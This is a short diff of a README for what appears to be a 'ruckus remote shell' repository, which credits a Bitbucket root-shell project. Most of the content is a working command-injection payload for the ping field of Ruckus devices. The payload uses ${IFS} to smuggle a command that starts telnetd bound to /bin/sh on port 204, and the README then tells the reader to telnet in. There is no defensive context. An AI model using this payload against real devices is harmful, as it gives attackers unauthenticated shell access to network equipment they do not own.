@@ -1,7 +1,8 @@
-# ruckusremoteshell
-ruckusremoteshell
+# ruckus remote shell
+ruckus remote shell
+Thanks to https://bitbucket.org/dudux/ruckus-rootshell
 
-run this in ping:
+#run follow in ping:
 |telnetd${IFS}-p${IFS}204${IFS}-l${IFS}/bin/sh
 
 then telnet to port 204
